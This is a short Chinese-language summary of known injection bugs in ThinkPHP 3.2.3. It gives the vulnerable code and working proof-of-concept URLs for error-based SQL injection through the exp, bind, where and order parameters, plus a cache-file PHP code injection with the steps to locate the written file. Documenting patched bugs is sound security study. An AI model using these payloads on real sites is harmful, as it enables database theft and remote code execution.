# tp3
tp3注入总结。


漏洞版本3.2.3，听说这个版本是tp3使用最广泛的版本，但是截止到2021应该已经都升级到3.2.5。         
3.2.5是tp3最后一个版本，修复了下面这些注入漏洞。    

附加了一个缓存的洞，出镜率比较高。其实tp3还有一堆命令执行的可直接看最后的参考文章，写的都不错。   

## exp注入
```
$User->field('username,age')->where(array('username'=>$name))->select();
```

直接传数组，第一个参数是exp表达式直接放过。
接收参数如果没有使用I方法，而是直接使用$_GET等接收外部变量，那么这里就有sql注入的问题。   
```
http://tp.test:8888/index.php/home/index/test?name[0]=exp&name[1]=='1' and (extractvalue(1,concat(0x7e,(select user()),0x7e))) #
```

## update注入
```
        $res = $User->where(array('name'=>$name))->save($data);
```
利用I方法获取输入时并没有过滤BIND，后面修过一次过滤了BIND。    
如果直接$_GET等接收外部变量一定存在       
```
http://tp.test:8888/index.php/home/index/test?name[0]=bind&name[1]=0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+
```
## where 注入
```
  	$res = $User->find($id);
```

 传入可控的where条件导致，delete(), select() ，find()方法具有相同问题，也在ThinkPHP3.2.4中被修复    
 ```
http://tp.test:8888/home/index/test?id[where]=(1=1) and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+
```
## order by 注入

```
res = $User->order($order)->find();
```
order参数可控的场景   
```
http://tp.test:8888/home/index/test?order=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)
```

## 缓存漏洞
在TP5一些版本中也有这个漏洞，但是TP5的入口文件更加安全，这个漏洞并一定能利用。    
```
http://tp.test:8888/home/index/test?name=%0d%0aphpinfo();%0d%0a//   
```
```
0x0d - \r, carrige return 回车
0x0a - \n, new line 换行
Windows 中换行为0d 0a
UNIX 换行为 0a
```

参数名`name`决定泄露缓存文件名，
```
S('name',$name);
```
md5(name)=b068931cc450442b63f5b3d276ea4297，   
文件名则为：b068931cc450442b63f5b3d276ea4297.php，   
默认目录为Application/Runtime/Temp，然后访问我们的php文件   




# 参考



- https://github.com/top-think/thinkphp   
- https://xz.aliyun.com/t/2630
- https://www.freebuf.com/vuls/282906.html
- https://www.anquanke.com/post/id/250537









